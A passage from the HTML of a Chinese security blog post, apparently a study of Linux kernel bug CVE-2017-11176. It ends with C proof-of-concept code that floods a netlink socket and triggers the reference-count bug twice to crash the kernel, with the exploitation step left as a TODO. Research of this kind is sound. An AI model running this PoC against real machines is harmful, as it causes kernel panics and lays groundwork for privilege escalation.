class="keyword">sizeof</span>(new_size)))</span><br><span class="line">    perror(<span class="string">&quot;[-] setsockopt&quot;</span>); <span class="comment">// no worry if it fails, it is just an optim.</span></span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] receive buffer reduced\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] flooding socket\n&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> (_sendmsg(send_fd, &amp;mhdr, MSG_DONTWAIT) &gt; <span class="number">0</span>)</span><br><span class="line">    ;</span><br><span class="line">  <span class="keyword">if</span> (errno != EAGAIN)</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] sendmsg&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] flood completed\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  _close(send_fd);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] blocking socket ready\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> recv_fd;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] failed to prepare block socket\n&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> sock_fd  = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">int</span> sock_fd2 = <span class="number">-1</span>;</span><br><span class="line">  <span class="keyword">int</span> unblock_fd = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] -=&#123; CVE-2017-11176 Exploit &#125;=-\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ((sock_fd = prepare_blocking_socket()) &lt; <span class="number">0</span>)</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] netlink socket created = %d\n&quot;</span>, sock_fd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (((unblock_fd = _dup(sock_fd)) &lt; <span class="number">0</span>) || ((sock_fd2 = _dup(sock_fd)) &lt; <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    perror(<span class="string">&quot;[-] dup&quot;</span>);</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[+] netlink fd duplicated (unblock_fd=%d, sock_fd2=%d)\n&quot;</span>, unblock_fd, sock_fd2);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// trigger the bug twice</span></span><br><span class="line">  <span class="keyword">if</span> (decrease_sock_refcounter(sock_fd, unblock_fd) ||</span><br><span class="line">      decrease_sock_refcounter(sock_fd2, unblock_fd))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">goto</span> fail;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[ ] ready to crash?\n&quot;</span>);</span><br><span class="line">  PRESS_KEY();</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> exploit</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fail:</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;[-] exploit failed!\n&quot;</span>);</span><br><span class="line">  PRESS_KEY();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br><span class="line"><span class="comment">// ----------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment">// ============================================================================</span></span><br></pre></td></tr></table></figure>

<p>实际测试时，该PoC并不能稳定触发所使用的虚拟机Kernel Panic，需要多次运行exploit。</p>

    </div>

    
    
    

    <footer class="post-footer">
          <div class="post-tags">
              <a href="/tags/kernel/" rel="tag"># kernel</a>
              <a href="/tags/cve/" rel="tag"># cve</a>
              <a href="/tags/vul/" rel="tag"># vul</a>
          </div>

        

          <div class="post-nav">
            <div class="post-nav-item">
                <a href="/2019/09/29/elf-init-fini-note/" rel="prev" title=".init and .fini">
                  <i class="fa fa-chevron-left"></i> .init and .fini
                </a>
            </div>
            <div class="post-nav-item">
                <a href="/2019/10/22/hwb19-final-pwn/" rel="next" title="护网杯2019线下赛 部分Pwn WriteUp">
                  护网杯2019线下赛 部分Pwn WriteUp <i class="fa fa-chevron-right"></i>
                </a>
            </div>
          </div>
    </footer>
  </article>
  
  
  



      

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      const commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

    </div>
  </main>

  <footer class="footer">
    <div class="footer-inner">
      

      

<div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">sunichi</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/muse/" class="theme-link" rel="noopener" target="_blank">NexT.Muse</a> 强力驱动
  </div>

    </div>
  </footer>

  
  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.0/lib/anime.min.js"></script>
<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>

  


















  








  

  

</body>
</html>
